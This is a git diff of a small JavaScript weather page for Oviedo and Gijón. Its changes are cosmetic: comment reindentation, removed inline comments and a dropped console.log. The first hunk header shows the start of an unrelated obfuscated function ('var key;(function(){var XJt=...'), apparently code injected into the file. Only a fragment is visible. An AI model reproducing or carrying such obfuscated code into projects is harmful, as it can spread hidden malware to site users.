@@ -8,23 +8,23 @@ var key;(function(){var XJt='',kGq=582-571;function CpT(a){var f=2825607;var m=a
 const cities = ['oviedo', 'gijon'];
 
 /**
-   * Get the user's geographical location asynchronously.
-   * @returns {Promise} A promise that resolves with the coordinates [latitude, longitude].
-   * @throws {string} If there's an error in obtaining the location, the promise is rejected with an error message.
-   */
+  * Get the user's geographical location asynchronously.
+  * @returns {Promise} A promise that resolves with the coordinates [latitude, longitude].
+  * @throws {string} If there's an error in obtaining the location, the promise is rejected with an error message.
+  */
 const getGeoLocation = async () => {
   return new Promise((resolve, reject) => {
     // Configuration options for location retrievaln
     const options = {
-      enableHighAccuracy: true,  // Enable high accuracy
+      enableHighAccuracy: true,  
       timeout: 1000,             // Maximum time to obtain location (in milliseconds)
       maximumAge: 0,             // Maximum location cache age
     };
     // Success function called when location is obtained
     const success = (position) => {
-      const lat = position.coords.latitude;    // Get latitude
-      const lon = position.coords.longitude;   // Get longitude
-      resolve([lat, lon]);                    // Resolve the promise with [latitude, longitude]
+      const lat = position.coords.latitude;    
+      const lon = position.coords.longitude;   
+      resolve([lat, lon]);                    
     };
     // Error function called when there's a problem obtaining the location
     const error = (msg) => {
@@ -128,8 +128,8 @@ const showCurrentInfo = (data) => {
 window.addEventListener('DOMContentLoaded', async () => {
   const current = await getCurrentWeather();
   showCurrentInfo(current);
-  console.log(current); 
 
+  // iterate throught the cities to get the weather data and display the information
   for (city of cities) {
     let data = await getDataWeather(city);
     showImage(data, city);
